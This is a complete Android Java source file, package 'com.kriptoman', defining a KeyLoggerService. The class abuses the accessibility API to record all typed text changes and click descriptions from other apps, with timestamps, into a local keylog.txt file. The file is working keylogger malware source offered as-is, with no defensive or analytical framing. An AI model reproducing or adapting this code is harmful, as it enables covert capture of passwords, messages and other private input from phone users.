package com.kriptoman;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.content.Intent;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;

import java.io.File;
import java.io.FileOutputStream;
import java.io.PrintWriter;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class KeyLoggerService extends AccessibilityService {
    private static final String TAG = "KeyLogger";
    private PrintWriter writer;
    private String logFile;

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            // Запись текста
            if (event.getText() != null && !event.getText().isEmpty()) {
                String text = event.getText().toString();
                logKey(text);
            }
        } else if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_CLICKED) {
            // Можно записывать клики
            CharSequence content = event.getContentDescription();
            if (content != null) {
                logKey("[CLICK] " + content.toString());
            }
        }
        // Другие события можно добавить
    }

    private void logKey(String text) {
        try {
            if (writer == null) {
                File dir = getExternalFilesDir(null);
                if (dir != null && !dir.exists()) dir.mkdirs();
                logFile = new File(dir, "keylog.txt").getAbsolutePath();
                writer = new PrintWriter(new FileOutputStream(logFile, true), true);
            }
            String timestamp = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(new Date());
            writer.println(timestamp + " - " + text);
            writer.flush();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public void onInterrupt() {
        // nothing
    }

    @Override
    public void onServiceConnected() {
        super.onServiceConnected();
        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED | AccessibilityEvent.TYPE_VIEW_CLICKED;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        info.notificationTimeout = 100;
        setServiceInfo(info);
        Log.d(TAG, "KeyLoggerService запущен");
    }

    @Override
    public void onDestroy() {
        if (writer != null) {
            writer.close();
            writer = null;
        }
        super.onDestroy();
    }
}
